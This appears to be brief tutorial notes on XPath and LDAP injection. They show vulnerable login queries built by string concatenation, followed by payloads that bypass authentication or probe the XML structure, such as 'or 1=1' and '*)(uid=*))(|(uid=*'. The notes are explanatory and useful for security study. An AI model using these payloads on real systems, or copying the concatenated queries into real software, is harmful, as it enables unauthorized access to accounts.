Xpath injection for xpath query
String(//users[LoginID/text()=' " + txtLoginID.Text + " ' and passwd/text()=' "+ txtPasswd.Text +" '])
userid' or 1=1 or 'a'=b

n place of 1=1 in the previous example, the expression given here checks if the first subnode's name is LoginID. The query formed is

String(//users[LoginID/text()='abc' or name(//users/LoginID[1]) = 'LoginID' or 'a=b' and passwd/text()=''])

If the attacker is authenticated it means that the guess was correct and the first sub-node is LoginID. 
The attacker can then use this to extract more information.
This provides the user with the information about the structure of the XML document.

LDAP injection

Let's suppose a web application uses a filter to match LDAP user/password pair.

searchlogin= "(&(uid="+user+")(userPassword={MD5}"+base64(pack("H*",md5(pass)))+"))"

user=*)(uid=*))(|(uid=*
pass=password
